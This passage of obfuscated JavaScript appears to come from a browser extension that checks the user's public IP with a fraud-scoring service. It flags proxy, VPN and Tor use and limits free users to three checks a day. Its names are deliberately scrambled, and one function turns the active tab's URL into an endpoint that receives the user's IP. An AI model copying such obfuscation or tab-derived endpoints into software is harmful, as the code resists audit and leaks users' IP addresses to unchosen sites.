      var _0x2aa118 = document.getElementById("dashId");
      var _0xde0977 = document.getElementById("dashRole");
      if (_0xf8d4e8) {
        _0xf8d4e8.textContent = "User Name: " + (_0x12065a || "—");
      }
      if (_0x2aa118) {
        _0x2aa118.textContent = "ID: " + (_0xcad2e4 || "—");
      }
      if (_0xde0977) {
        _0xde0977.textContent = "Role: " + (userRole || "—").toUpperCase();
      }
    }
    function _0x4162d0(_0x3315e5, _0x5b123c) {
      var _0x4565ef = typeof _0x3315e5 === "number" ? _0x3315e5 : 0;
      var _0x5a2e28 = typeof _0x5b123c === "number" ? _0x5b123c : 0;
      _0x5d57eb.textContent = _0x4565ef;
      _0x347659.textContent = _0x5a2e28;
      _0x469450.textContent = _0x5a2e28 > 0 ? Math.round(_0x4565ef / _0x5a2e28 * 100) + "%" : "0%";
      chrome.storage.local.set({
        tya_local_hits: _0x4565ef,
        tya_local_attempts: _0x5a2e28
      });
    }
    function _0x4723e5(_0x31e22b, _0x419a6b, _0x4edc20, _0x307cb1) {
      if (_0x4edc20 && _0x4edc20.length > 5) {
        var _0xae54fc = new Image();
        _0xae54fc.crossOrigin = "anonymous";
        _0xae54fc.onload = function () {
          _0x31e22b.src = _0x4edc20;
          _0x31e22b.style.display = "block";
          if (_0x419a6b) {
            _0x419a6b.style.display = "none";
          }
        };
        _0xae54fc.onerror = function () {
          _0x31e22b.style.display = "none";
          if (_0x419a6b) {
            _0x419a6b.style.display = "flex";
            _0x419a6b.textContent = (_0x307cb1 || "?").charAt(0).toUpperCase();
          }
        };
        _0xae54fc.src = _0x4edc20;
      } else {
        _0x31e22b.style.display = "none";
        if (_0x419a6b) {
          _0x419a6b.style.display = "flex";
          _0x419a6b.textContent = (_0x307cb1 || "?").charAt(0).toUpperCase();
        }
      }
    }
    function _0x3f5946(_0x1e60bf) {
      if (!_0x1e60bf) {
        return "--";
      }
      var _0xb0dd54 = Math.floor((Date.now() - new Date(_0x1e60bf).getTime()) / 1000);
      if (_0xb0dd54 < 60) {
        return _0xb0dd54 + "s ago";
      }
      if (_0xb0dd54 < 3600) {
        return Math.floor(_0xb0dd54 / 60) + "m ago";
      }
      if (_0xb0dd54 < 86400) {
        return Math.floor(_0xb0dd54 / 3600) + "h ago";
      }
      return Math.floor(_0xb0dd54 / 86400) + "d ago";
    }
    function _0x257aa3(_0xc8c3c4) {
      if (!_0xc8c3c4) {
        return "----";
      }
      var _0x5e51a0 = _0xc8c3c4.split("|");
      var _0x3f7739 = _0x5e51a0[0] || "----";
      var _0xa788ba = _0x5e51a0[1] || "--";
      var _0x51a66a = _0x5e51a0[2] || "--";
      var _0x11e088 = _0x5e51a0[3] || "---";
      return _0x3f7739 + "|" + _0xa788ba + "|" + _0x51a66a + "|" + _0x11e088;
    }
    function _0x3b7b71(_0x237d55) {
      if (!_0x237d55) {
        return "";
      }
      return String(_0x237d55).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
    }
    function _0x4db7b6(_0x355a25) {
      return _0x3b7b71(_0x355a25);
    }
    function _0x3db187(_0x425564, _0x3cdfb6) {
      navigator.clipboard.writeText(_0x425564).then(function () {
        _0x3cdfb6.classList.add("copied");
        var _0x449191 = _0x3cdfb6.title;
        _0x3cdfb6.title = "Copied!";
        _0x333cc9("Copy Successful");
        setTimeout(function () {
          _0x3cdfb6.classList.remove("copied");
          _0x3cdfb6.title = _0x449191;
        }, 2000);
      }).catch(function (_0x28c30d) {
        console.error("Failed to copy:", _0x28c30d);
        _0x333cc9("Copy Failed", "error");
      });
    }
    function _0x333cc9(_0x53d23c, _0x520a24) {
      _0x520a24 = _0x520a24 || "success";
      var _0x2b3376 = document.createElement("div");
      _0x2b3376.className = "copy-notification " + _0x520a24;
      _0x2b3376.textContent = _0x53d23c;
      _0x2b3376.style.cssText = "\n        position: fixed;\n        top: 20px;\n        right: 20px;\n        background: " + (_0x520a24 === "success" ? "#44ACFF" : "#f44336") + ";\n        color: white;\n        padding: 12px 20px;\n        border-radius: 6px;\n        font-size: 13px;\n        font-weight: 600;\n        z-index: 10000;\n        animation: slideIn 0.3s ease-out;\n        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);\n      ";
      document.body.appendChild(_0x2b3376);
      setTimeout(function () {
        _0x2b3376.style.animation = "slideOut 0.3s ease-in";
        setTimeout(function () {
          if (_0x2b3376.parentNode) {
            _0x2b3376.parentNode.removeChild(_0x2b3376);
          }
        }, 300);
      }, 2000);
    }
    function _0x1c77ec() {
      if (_0x5af60b) {
        _0x5af60b.textContent = "Loading...";
        _0x5af60b.classList.add("blurred");
      }
      if (_0x34b446) {
        _0x34b446.textContent = "...";
        _0x34b446.className = "ipcheck-badge low";
      }
      if (_0x1d4187) {
        _0x1d4187.textContent = "Score: --/100";
      }
      if (_0x5334f4) {
        _0x5334f4.textContent = "Checking current network...";
      }
      if (_0xd3051b) {
        _0xd3051b.textContent = "--";
      }
      if (_0x471243) {
        _0x471243.textContent = "--";
      }
      if (_0x2658de) {
        _0x2658de.textContent = "--";
      }
      if (_0x4d0601) {
        _0x4d0601.textContent = "--";
      }
      if (_0x5e8ba6) {
        _0x5e8ba6.textContent = "-";
      }
      if (_0x458fa3) {
        _0x458fa3.textContent = "Default mode uses a direct public IP intelligence lookup. You can point the gear icon to your own Express endpoint.";
      }
      if (typeof _0x3a3393 === "function") {
        _0x3a3393(0, "low");
      }
    }
    function _0x33c83a(_0x2d511b) {
      _0x2d511b = parseInt(_0x2d511b, 10);
      if (isNaN(_0x2d511b)) {
        _0x2d511b = 0;
      }
      if (_0x2d511b < 0) {
        _0x2d511b = 0;
      }
      if (_0x2d511b > 100) {
        _0x2d511b = 100;
      }
      return _0x2d511b;
    }
    function _0x5fcce1(_0x20663b) {
      _0x20663b = _0x33c83a(_0x20663b);
      if (_0x20663b >= 75) {
        return "very-high";
      }
      if (_0x20663b >= 50) {
        return "high";
      }
      if (_0x20663b >= 25) {
        return "medium";
      }
      return "low";
    }
    function _0x1e30d2(_0x25687b) {
      var _0x3ff335 = _0x5fcce1(_0x25687b);
      if (_0x3ff335 === "very-high") {
        return "VERY HIGH";
      }
      if (_0x3ff335 === "high") {
        return "HIGH";
      }
      if (_0x3ff335 === "medium") {
        return "MEDIUM";
      }
      return "LOW";
    }
    function _0x39ea53(_0x28ebfb) {
      if (typeof _0x28ebfb === "number") {
        return _0x28ebfb;
      }
      if (!_0x28ebfb) {
        return 0;
      }
      var _0x27d60c = String(_0x28ebfb).match(/([0-9]+(?:\.[0-9]+)?)/);
      if (_0x27d60c) {
        return parseFloat(_0x27d60c[1]);
      } else {
        return 0;
      }
    }
    function _0x3a3393(_0x4e9577, _0x15f185) {
      var _0x49feb5 = _0x399a6a ? _0x399a6a.querySelectorAll("span") : [];
      var _0x18c1c4 = Math.max(1, Math.ceil(_0x33c83a(_0x4e9577) / 10));
      _0x49feb5.forEach(function (_0x2aeb60, _0x54dd87) {
        _0x2aeb60.className = _0x54dd87 < _0x18c1c4 ? "active " + _0x15f185 : "";
      });
    }
    function _0x3b8643(_0x2ef140) {
      if (!_0x2ef140 || String(_0x2ef140).length !== 2) {
        return "-";
      }
      return String(_0x2ef140).toUpperCase().replace(/./g, function (_0x4a1a13) {
        return String.fromCodePoint(127397 + _0x4a1a13.charCodeAt(0));
      });
    }
    function _0x3410dc(_0x23de31, _0x3752f1) {
      if (!_0x23de31) {
        return "";
      }
      if (_0x23de31.indexOf("{ip}") !== -1) {
        return _0x23de31.replace(/\{ip\}/g, encodeURIComponent(_0x3752f1));
      }
      return _0x23de31 + (_0x23de31.indexOf("?") === -1 ? "?ip=" : "&ip=") + encodeURIComponent(_0x3752f1);
    }
    function _0x3eed76(_0x2cac16) {
      var _0x14e73d = 5;
      if (!_0x2cac16) {
        return _0x14e73d;
      }
      if (_0x2cac16.is_mobile) {
        _0x14e73d -= 3;
      }
      if (_0x2cac16.is_crawler) {
        _0x14e73d += 20;
      }
      if (_0x2cac16.is_datacenter) {
        _0x14e73d += 25;
      }
      if (_0x2cac16.is_vpn) {
        _0x14e73d += 35;
      }
      if (_0x2cac16.is_proxy) {
        _0x14e73d += 40;
      }
      if (_0x2cac16.is_tor) {
        _0x14e73d += 50;
      }
      if (_0x2cac16.is_abuser) {
        _0x14e73d += 45;
      }
      _0x14e73d += Math.min(12, Math.round(_0x39ea53(_0x2cac16.company && _0x2cac16.company.abuser_score) * 2000));
      _0x14e73d += Math.min(8, Math.round(_0x39ea53(_0x2cac16.asn && _0x2cac16.asn.abuser_score) * 1500));
      return _0x33c83a(_0x14e73d);
    }
    function _0x94dd0a(_0x22ae80, _0x21350d, _0x11dcb1) {
      var _0x52a659 = _0x22ae80.location || {};
      var _0x5aa178 = _0x22ae80.company || {};
      var _0x5a7630 = _0x22ae80.asn || {};
      var _0x5d0edd = _0x22ae80.score;
      if (_0x5d0edd == null && _0x22ae80.ipapi_score != null) {
        _0x5d0edd = _0x22ae80.ipapi_score;
      }
      if (_0x5d0edd == null && _0x22ae80.fraud_score != null) {
        _0x5d0edd = _0x22ae80.fraud_score;
      }
      if (_0x5d0edd == null && _0x22ae80.risk_score != null) {
        _0x5d0edd = _0x22ae80.risk_score;
      }
      if (_0x5d0edd == null && (_0x22ae80.is_proxy != null || _0x22ae80.is_vpn != null || _0x22ae80.company || _0x22ae80.location)) {
        _0x5d0edd = _0x3eed76(_0x22ae80);
      }
      _0x5d0edd = _0x33c83a(_0x5d0edd);
      if (_0x22ae80.ip_fraud_check) {
        var _0x564a33 = _0x22ae80.ip_fraud_check;
        return {
          ip: _0x564a33.your_ip || _0x21350d,
          score: _0x33c83a(_0x564a33.risk_score ?? _0x5d0edd),
          risk: _0x564a33.risk_level || _0x1e30d2(_0x5d0edd),
          country: _0x564a33.country || _0x52a659.country || "N/A",
          countryCode: _0x564a33.country_code || _0x52a659.country_code || "",
          state: _0x564a33.region || _0x52a659.state || "N/A",
          city: _0x564a33.city || _0x52a659.city || "N/A",
          isp: _0x564a33.isp || _0x5aa178.name || "N/A",
          org: _0x564a33.org || _0x5a7630.org || _0x5aa178.name || "N/A",
          asn: _0x564a33.asn || "AS" + (_0x5a7630.asn || "Unknown"),
          latitude: _0x564a33.latitude || _0x52a659.latitude || "N/A",
          longitude: _0x564a33.longitude || _0x52a659.longitude || "N/A",
          timeZone: _0x564a33.time_zone || _0x52a659.timezone || "N/A",
          proxy: _0x564a33.proxy || "False",
          connectionType: _0x564a33.connection_type || "Normal",
          operatorName: _0x564a33.operator_name || "No",
          osHighestClass: _0x564a33.os_highest_class || "N/A",
          proxyUsed: _0x564a33.proxy_used || "N/A",
          authMethod: _0x564a33.auth_method || "none",
          scamalyticsScore: _0x564a33.scamalytics_score ?? _0x564a33.risk_score,
          ipapiScore: _0x564a33.ipapi_score ?? _0x564a33.risk_score,
          source: _0x11dcb1 || "ipapi.is",
          foot: _0x564a33.proxy === "True" || _0x564a33.is_vpn === "True" ? "Proxy/VPN detected" : "Clean",
          flags: {
            proxy: _0x564a33.proxy === "True",
            vpn: _0x564a33.is_vpn === "True",
            tor: _0x564a33.is_tor === "True",
            datacenter: _0x564a33.is_datacenter === "True",
            abuser: _0x564a33.is_abuser === "True"
          }
        };
      }
      return {
        ip: _0x22ae80.ip || _0x21350d,
        score: _0x5d0edd,
        risk: _0x1e30d2(_0x5d0edd),
        country: _0x52a659.country || _0x22ae80.country || _0x22ae80.country_name || "N/A",
        countryCode: _0x52a659.country_code || _0x22ae80.country_code || _0x22ae80.isocode || "",
        state: _0x52a659.state || _0x22ae80.region || _0x22ae80.region_name || "N/A",
        city: _0x52a659.city || _0x22ae80.city || _0x22ae80.city_name || "N/A",
        isp: _0x5aa178.name || _0x22ae80.ISP || _0x22ae80.isp || _0x22ae80.provider || _0x22ae80.organization || "N/A",
        org: _0x5a7630.org || _0x5aa178.name || _0x22ae80.organization || "N/A",
        asn: "AS" + (_0x5a7630.asn || _0x22ae80.asn || "Unknown"),
        latitude: _0x52a659.latitude || _0x22ae80.latitude || "N/A",
        longitude: _0x52a659.longitude || _0x22ae80.longitude || "N/A",
        timeZone: _0x52a659.timezone || _0x22ae80.timezone || "N/A",
        proxy: _0x22ae80.is_proxy ? "True" : "False",
        connectionType: _0x22ae80.is_vpn ? "VPN" : _0x22ae80.is_proxy ? "Proxy" : _0x22ae80.is_datacenter ? "Datacenter" : "Normal",
        operatorName: _0x5aa178.name || _0x22ae80.organization || "No",
        osHighestClass: "N/A",
        scamalyticsScore: _0x22ae80.scamalytics_score ?? _0x22ae80.risk_score,
        ipapiScore: _0x22ae80.ipapi_score ?? _0x22ae80.risk_score,
        source: _0x11dcb1 || "ipapi.is",
        foot: _0x22ae80.message || _0x22ae80.notes || _0x22ae80.reason || "",
        flags: {
          proxy: !!_0x22ae80.is_proxy,
          vpn: !!_0x22ae80.is_vpn,
          tor: !!_0x22ae80.is_tor,
          datacenter: !!_0x22ae80.is_datacenter,
          abuser: !!_0x22ae80.is_abuser
        }
      };
    }
    function _0x3b82da(_0x16f902) {
      var _0xa5387b = _0x33c83a(_0x16f902.score);
      var _0x308d7d = _0x5fcce1(_0xa5387b);
      var _0x5c1b18 = _0x1e30d2(_0xa5387b);
      var _0x223b69 = [];
      if (_0x16f902.flags.proxy) {
        _0x223b69.push("Proxy");
      }
      if (_0x16f902.flags.vpn) {
        _0x223b69.push("VPN");
      }
      if (_0x16f902.flags.tor) {
        _0x223b69.push("Tor");
      }
      if (_0x16f902.flags.datacenter) {
        _0x223b69.push("Datacenter");
      }
      if (_0x16f902.flags.abuser) {
        _0x223b69.push("Abuser");
      }
      _0x5af60b.textContent = _0x16f902.ip || "--";
      _0x5af60b.classList.toggle("blurred", !_0x17a848);
      _0x34b446.textContent = _0x5c1b18;
      _0x34b446.className = "ipcheck-badge " + _0x308d7d;
      _0x1d4187.textContent = "Score: " + _0xa5387b + "/100";
      _0x5334f4.textContent = "Source: " + (_0x16f902.source || "Direct lookup");
      _0xd3051b.textContent = _0x16f902.country || "--";
      _0x471243.textContent = _0x16f902.state || "--";
      _0x2658de.textContent = _0x16f902.city || "--";
      _0x4d0601.textContent = _0x16f902.isp || "--";
      _0x5e8ba6.textContent = _0x3b8643(_0x16f902.countryCode);
      _0x458fa3.textContent = _0x16f902.foot || (_0x223b69.length ? "Signals: " + _0x223b69.join(", ") : "No elevated fraud indicators were returned for this IP.");
      _0x3a3393(_0xa5387b, _0x308d7d);
    }
    function _0x4adf67(_0x3b7f33) {
      if (_0x5af60b) {
        _0x5af60b.textContent = "Unavailable";
        _0x5af60b.classList.remove("blurred");
      }
      if (_0x34b446) {
        _0x34b446.textContent = "ERROR";
        _0x34b446.className = "ipcheck-badge high";
      }
      if (_0x1d4187) {
        _0x1d4187.textContent = "Score: --/100";
      }
      if (_0x5334f4) {
        _0x5334f4.textContent = "Source: request failed";
      }
      if (_0xd3051b) {
        _0xd3051b.textContent = "--";
      }
      if (_0x471243) {
        _0x471243.textContent = "--";
      }
      if (_0x2658de) {
        _0x2658de.textContent = "--";
      }
      if (_0x4d0601) {
        _0x4d0601.textContent = "--";
      }
      if (_0x5e8ba6) {
        _0x5e8ba6.textContent = "-";
      }
      if (_0x458fa3) {
        _0x458fa3.textContent = _0x3b7f33 || "Unable to fetch IP fraud details.";
      }
      _0x3a3393(0, "low");
    }
    function _0x403059() {
      return fetch(_0x439200).then(function (_0x117282) {
        return _0x117282.json();
      }).then(function (_0x4f8924) {
        if (!_0x4f8924 || !_0x4f8924.ip) {
          throw new Error("Missing IP address");
        }
        return _0x4f8924.ip;
      });
    }
    function _0x41d898(_0x269a51) {
      return fetch(_0x345137 + encodeURIComponent(_0x269a51)).then(function (_0x4cc82c) {
        if (!_0x4cc82c.ok) {
          throw new Error("Direct IP intel request failed");
        }
        return _0x4cc82c.json();
      }).then(function (_0x17822b) {
        return _0x94dd0a(_0x17822b, _0x269a51, "ipapi.is direct");
      });
    }
    function _0x3b6f1b(_0x173824, _0x2b52b8) {
      var _0x3cd4f7 = _0x2b52b8 || _0x4dfe00;
      if (!_0x3cd4f7) {
        return Promise.reject(new Error("No custom endpoint set"));
      }
      return fetch(_0x3410dc(_0x3cd4f7, _0x173824), {
        method: "GET",
        headers: {
          Accept: "application/json"
        }
      }).then(function (_0x176bd3) {
        if (!_0x176bd3.ok) {
          throw new Error("Custom endpoint returned " + _0x176bd3.status);
        }
        return _0x176bd3.json();
      }).then(function (_0x1dbd36) {
        return _0x94dd0a(_0x1dbd36, _0x173824, "custom endpoint");
      });
    }
    function _0x557f49(_0x314cb) {
      if (!_0x314cb) {
        return "";
      }
      try {
        var _0x939cd3 = new URL(_0x314cb);
        var _0x3dac9d = new URLSearchParams(_0x939cd3.search);
        if (_0x3dac9d.has("ip")) {
          _0x3dac9d.set("ip", "{ip}");
          _0x939cd3.search = _0x3dac9d.toString();
          return _0x939cd3.toString();
        }
        var _0x545a5f = _0x939cd3.pathname.toLowerCase();
        if (_0x545a5f.includes("/ip") || _0x545a5f.includes("/check") || _0x545a5f.includes("/scan") || _0x545a5f.includes("/lookup") || _0x545a5f.includes("/api") || _0x545a5f.includes("/express")) {
          return _0x939cd3.origin + _0x939cd3.pathname + (_0x939cd3.search ? "&" : "?") + "ip={ip}";
        }
      } catch (_0x13745a) {
        return "";
      }
      return "";
    }
    function _0x147b0d(_0x3e9912) {
      if (_0x4ee378) {
        _0x4ee378.style.display = _0x3e9912 ? "block" : "none";
      }
    }
    function _0x1c234b(_0x281273) {
      if (_0x20cb5d) {
        _0x20cb5d.classList.add("active");
      }
      _0x550dce(_0x281273, true);
    }
    function _0x550dce(_0x5a73f6, _0xb39495) {
      if (!_0x5a73f6 && _0xffa970) {
        return;
      }
      if (userRole === "user") {
        _0x3b69be(function (_0x500447, _0x5499c4) {
          if (!_0x500447) {
            _0x4adf67("Daily limit reached: Normal users can only run 3 IP Fraud Checks per day. Upgrade to Pro for unlimited access.");
            _0x147b0d(true);
            return;
          }
          _0x391189(_0x5a73f6, _0xb39495);
        });
        return;
      }
      _0x391189(_0x5a73f6, _0xb39495);
    }
    function _0x391189(_0x5147ef, _0x19a115) {
      _0xffa970 = true;
      _0x147b0d(false);
      _0x1c77ec();
      chrome.tabs.query({
        active: true,
        currentWindow: true
      }, function (_0x44ad1e) {
        var _0x1063b1 = "";
        var _0x2d79c3 = _0x44ad1e && _0x44ad1e[0] && _0x44ad1e[0].url ? _0x44ad1e[0].url : "";
        if (!_0x4dfe00 && _0x2d79c3) {
          _0x1063b1 = _0x557f49(_0x2d79c3);
        }
        _0x403059().then(function (_0x206af5) {
          var _0x232792 = _0x4dfe00 || _0x1063b1;
          if (_0x232792) {
            return _0x3b6f1b(_0x206af5, _0x232792).catch(function () {
              return _0x41d898(_0x206af5);
            });
          }
          return _0x41d898(_0x206af5);
        }).then(function (_0x290c22) {
          _0x3b82da(_0x290c22);
          _0x147b0d(true);
          if (_0x19a115) {
            _0x529889();
          }
        }).catch(function (_0x1de497) {
          _0x4adf67(_0x1de497 && _0x1de497.message ? _0x1de497.message : "Unable to fetch IP fraud details.");
          _0x147b0d(true);
        });
      });
    }
    function _0x15b0fb(_0x2fdf28) {
      var _0x10bece = new Date().toISOString().split("T")[0];
      chrome.storage.local.get(["tyagrey_ipfraud_count", "tyagrey_ipfraud_date"], function (_0x161543) {
        var _0x1c84d2 = _0x161543.tyagrey_ipfraud_count || 0;
        var _0x4f7c2d = _0x161543.tyagrey_ipfraud_date || "";
        if (_0x4f7c2d !== _0x10bece) {
          _0x1c84d2 = 0;
        }
        if (_0x1c84d2 >= 3) {
          _0x2fdf28(false, _0x1c84d2);
        } else {
          chrome.storage.local.set({
            tyagrey_ipfraud_count: _0x1c84d2 + 1,
            tyagrey_ipfraud_date: _0x10bece
          }, function () {
            _0x2fdf28(true, _0x1c84d2 + 1);
          });
        }
      });
    }
    function _0x529889(_0x28bff7) {
      if (userRole !== "user") {
        if (_0x28bff7) {
          _0x28bff7(true);
        }
        return;
      }
      if (!_0xc81f0) {
        _0x15b0fb(_0x28bff7 || function () {});
        return;
      }
      _0x59e7fa("check-ip-fraud-limit", {
        token: _0xc81f0,
        record: true
      }).then(function (_0x779609) {
        if (_0x779609 && _0x779609.success) {
          var _0x4764c7 = new Date().toISOString().split("T")[0];
          chrome.storage.local.set({
            tyagrey_ipfraud_count: _0x779609.count || 0,
            tyagrey_ipfraud_date: _0x4764c7
          });
          if (_0x28bff7) {
            _0x28bff7(_0x779609.allowed, _0x779609.count);
          }
        } else if (_0x28bff7) {
          _0x15b0fb(_0x28bff7);
        }
      }).catch(function () {
        if (_0x28bff7) {
          _0x15b0fb(_0x28bff7);
        }
      });
    }
    function _0x3b69be(_0x1d5734) {
      if (userRole !== "user") {
        _0x1d5734(true);
        return;
      }
      if (!_0xc81f0) {
        _0x15b0fb(_0x1d5734);
        return;
      }
      _0x59e7fa("check-ip-fraud-limit", {
        token: _0xc81f0,
        record: false
      }).then(function (_0x459db1) {
        if (_0x459db1 && _0x459db1.success) {
          if (_0x459db1.allowed) {
            _0x1d5734(true, _0x459db1.count);
          } else {
            _0x1d5734(false, _0x459db1.count);
          }
          var _0x39a213 = new Date().toISOString().split("T")[0];
          chrome.storage.local.set({
            tyagrey_ipfraud_count: _0x459db1.count || 0,
            tyagrey_ipfraud_date: _0x39a213
          });
        } else {
          _0x15b0fb(_0x1d5734);
        }
      }).catch(function () {
        _0x15b0fb(_0x1d5734);
      });
    }
    function _0x4edc0a(_0x43ad5e, _0x20f883) {
      _0x44f711 = true;
      if (userRole === "user") {
        _0x3b69be(function (_0x2fab0d, _0x50c8fd) {
          if (!_0x2fab0d) {
            _0x572e29("Daily limit reached: Normal users can only run 3 IP Fraud Checks per day. Upgrade to Pro for unlimited access.");
            return;
          }
          _0x2e29a7(_0x43ad5e, _0x20f883);
        });
        return;
      }
      _0x2e29a7(_0x43ad5e, _0x20f883);
    }
    function _0x2e29a7(_0x39019b, _0x34f5bd) {
      _0x281b43();
      chrome.tabs.query({
        active: true,
        currentWindow: true
      }, function (_0x5deacc) {
        var _0x3d8eb2 = "";
        var _0x17890f = _0x5deacc && _0x5deacc[0] && _0x5deacc[0].url ? _0x5deacc[0].url : "";
        if (!_0x4dfe00 && _0x17890f) {
          _0x3d8eb2 = _0x557f49(_0x17890f);
        }
        _0x403059().then(function (_0x50e5e2) {
          var _0x21e11f = _0x4dfe00 || _0x3d8eb2;
          if (_0x21e11f) {
            return _0x3b6f1b(_0x50e5e2, _0x21e11f).catch(function () {
              return _0x41d898(_0x50e5e2);
            });
          }
          return _0x41d898(_0x50e5e2);
        }).then(function (_0x5bb21d) {
          _0x49c513(_0x5bb21d);
          if (_0x34f5bd) {
            _0x529889();
          }
        }).catch(function (_0x340105) {
          _0x572e29(_0x340105 && _0x340105.message ? _0x340105.message : "Unable to fetch IP fraud details.");
        });
      });
    }
    function _0x281b43() {
      if (_0x440506) {
        _0x440506.style.display = "block";
      }
      if (_0xfc9f7c) {
        _0xfc9f7c.textContent = "Checking...";
      }
      if (_0x6cf872) {
        _0x6cf872.textContent = "Analyzing your current IP address...";
      }
      if (_0x50c3e9) {
        _0x50c3e9.textContent = "●●●●●●●●";
      }
      if (_0x5d412d) {
        _0x5d412d.textContent = "--";
      }
      if (_0x2f1d79) {
        _0x2f1d79.textContent = "--";
      }
      if (_0x5c126b) {
        _0x5c126b.textContent = "--";
      }
      if (_0x5f185c) {
        _0x5f185c.textContent = "--";
      }
      if (_0x17672e) {
        _0x17672e.textContent = "--";
      }
      if (_0x1b1b58) {
        _0x1b1b58.textContent = "--";
      }
      if (_0x5d1ec2) {
        _0x5d1ec2.textContent = "--";
      }
      if (_0x26d834) {
        _0x26d834.textContent = "--";
      }
      if (_0x355969) {
        _0x355969.textContent = "--";
      }
      if (_0x1b3724) {
        _0x1b3724.textContent = "--";
      }
      if (_0x593b5c) {
        _0x593b5c.textContent = "--";
      }
      if (_0x19bffc) {
        _0x19bffc.textContent = "--";
      }
      if (_0x503749) {
        _0x503749.textContent = "--";
      }
      if (_0x280edb) {
        _0x280edb.textContent = "--";
      }
      if (_0x27594a) {
        _0x27594a.textContent = "--";
      }
      if (_0xb89c2c) {
        _0xb89c2c.textContent = "--";
      }
      if (_0x1d5397) {
        _0x1d5397.textContent = "--";
      }
      if (_0x254a5c) {
        _0x254a5c.style.background = "linear-gradient(90deg, #4CAF50, #81C784)";
        _0x254a5c.style.borderColor = "#4CAF50";
        _0x254a5c.style.boxShadow = "0 0 12px rgba(76, 175, 80, 0.35)";
      }
      _0x38439c(0, "low");
    }
    function _0x49c513(_0xa7718d) {
      if (!_0x440506) {
        return;
      }
      _0x440506.style.display = "block";
      var _0x1fc952 = _0x33c83a(_0xa7718d.score);
      var _0x1f41b8 = _0x5fcce1(_0x1fc952);
      var _0x8f9cfc = _0x1e30d2(_0x1fc952);
      var _0x1e8cbe = [];
      if (_0xa7718d.flags.proxy) {
        _0x1e8cbe.push("Proxy");
      }
      if (_0xa7718d.flags.vpn) {
        _0x1e8cbe.push("VPN");
      }
      if (_0xa7718d.flags.tor) {
        _0x1e8cbe.push("Tor");
      }
      if (_0xa7718d.flags.datacenter) {
        _0x1e8cbe.push("Datacenter");
      }
      if (_0xa7718d.flags.abuser) {
        _0x1e8cbe.push("Abuser");
      }
      if (_0x254a5c) {
        _0x254a5c.className = "proxy-status-icon " + (_0x1fc952 >= 50 ? "connected" : "notset");
        if (_0x1f41b8 === "very-high") {
          _0x254a5c.style.background = "linear-gradient(90deg, #D32F2F, #B71C1C)";
          _0x254a5c.style.borderColor = "#D32F2F";
          _0x254a5c.style.boxShadow = "0 0 12px rgba(211, 47, 47, 0.35)";
        } else if (_0x1f41b8 === "high") {
          _0x254a5c.style.background = "linear-gradient(90deg, #FF7043, #F44336)";
          _0x254a5c.style.borderColor = "#FF7043";
          _0x254a5c.style.boxShadow = "0 0 12px rgba(255, 112, 67, 0.35)";
        } else if (_0x1f41b8 === "medium") {
          _0x254a5c.style.background = "linear-gradient(90deg, #FFB74D, #FF9800)";
          _0x254a5c.style.borderColor = "#FFB74D";
          _0x254a5c.style.boxShadow = "0 0 12px rgba(255, 183, 77, 0.35)";
        } else {
          _0x254a5c.style.background = "linear-gradient(90deg, #4CAF50, #81C784)";
          _0x254a5c.style.borderColor = "#4CAF50";
          _0x254a5c.style.boxShadow = "0 0 12px rgba(76, 175, 80, 0.35)";
        }
      }
      if (_0xfc9f7c) {
        _0xfc9f7c.textContent = _0x8f9cfc;
        _0xfc9f7c.className = "proxy-status-text " + _0x1f41b8;
      }
      if (_0x6cf872) {
        var _0x32a086 = "Score: " + _0x1fc952 + "/100 | " + (_0xa7718d.source || "Direct lookup");
        if (_0x1e8cbe.length) {
          _0x32a086 += " | Signals: " + _0x1e8cbe.join(", ");
        }
        _0x6cf872.textContent = _0x32a086;
      }
      if (_0x50c3e9) {
        _0x50c3e9.textContent = _0xa7718d.ip || "--";
        _0x50c3e9.classList.toggle("blurred", !_0x446570);
      }
      if (_0x5d412d) {
        _0x5d412d.textContent = _0xa7718d.isp || "--";
      }
      if (_0x2f1d79) {
        _0x2f1d79.textContent = _0xa7718d.org || "--";
      }
      if (_0x5c126b) {
        _0x5c126b.textContent = _0xa7718d.asn || "--";
      }
      if (_0x5f185c) {
        _0x5f185c.textContent = _0xa7718d.country || "--";
      }
      if (_0x17672e) {
        _0x17672e.textContent = _0xa7718d.countryCode || "--";
      }
      if (_0x1b1b58) {
        _0x1b1b58.textContent = _0xa7718d.state || "--";
      }
      if (_0x5d1ec2) {
        _0x5d1ec2.textContent = _0xa7718d.city || "--";
      }
      if (_0x26d834) {
        _0x26d834.textContent = _0xa7718d.latitude || "--";
      }
      if (_0x355969) {
        _0x355969.textContent = _0xa7718d.longitude || "--";
      }
      if (_0x1b3724) {
        _0x1b3724.textContent = _0xa7718d.timeZone || "--";
      }
      if (_0x593b5c) {
        _0x593b5c.textContent = _0xa7718d.proxy || "--";
      }
      if (_0x19bffc) {
        _0x19bffc.textContent = _0xa7718d.connectionType || "--";
      }
      if (_0x503749) {
        _0x503749.textContent = _0xa7718d.operatorName || "--";
      }
      if (_0x280edb) {
        _0x280edb.textContent = _0xa7718d.osHighestClass || "--";
      }
      if (_0x27594a) {
        _0x27594a.textContent = _0xa7718d.proxyUsed || "--";
      }
      if (_0xb89c2c) {
        _0xb89c2c.textContent = _0xa7718d.authMethod || "--";
      }
      if (_0x1d5397) {
        _0x1d5397.textContent = _0x1fc952 + "/100";
      }
      _0x38439c(_0x1fc952, _0x1f41b8);
    }
    function _0x572e29(_0x916c4f) {
      if (!_0x440506) {
        return;
      }
      _0x440506.style.display = "block";
      if (_0x254a5c) {
        _0x254a5c.className = "proxy-status-icon notset";
        _0x254a5c.style.background = "";
        _0x254a5c.style.borderColor = "";
        _0x254a5c.style.boxShadow = "";
      }
      if (_0xfc9f7c) {
        _0xfc9f7c.textContent = "Error";
      }
      if (_0x6cf872) {
        _0x6cf872.textContent = _0x916c4f || "Unable to fetch IP fraud details.";
      }
      if (_0x50c3e9) {
        _0x50c3e9.textContent = "--";
        _0x50c3e9.classList.remove("blurred");
      }
      if (_0x5d412d) {
        _0x5d412d.textContent = "--";
      }
      if (_0x2f1d79) {
        _0x2f1d79.textContent = "--";
      }
      if (_0x5c126b) {
        _0x5c126b.textContent = "--";
      }
      if (_0x5f185c) {
        _0x5f185c.textContent = "--";
      }
      if (_0x17672e) {
        _0x17672e.textContent = "--";
      }
      if (_0x1b1b58) {
        _0x1b1b58.textContent = "--";
      }
      if (_0x5d1ec2) {
        _0x5d1ec2.textContent = "--";
      }
      if (_0x26d834) {
        _0x26d834.textContent = "--";
      }
      if (_0x355969) {
        _0x355969.textContent = "--";
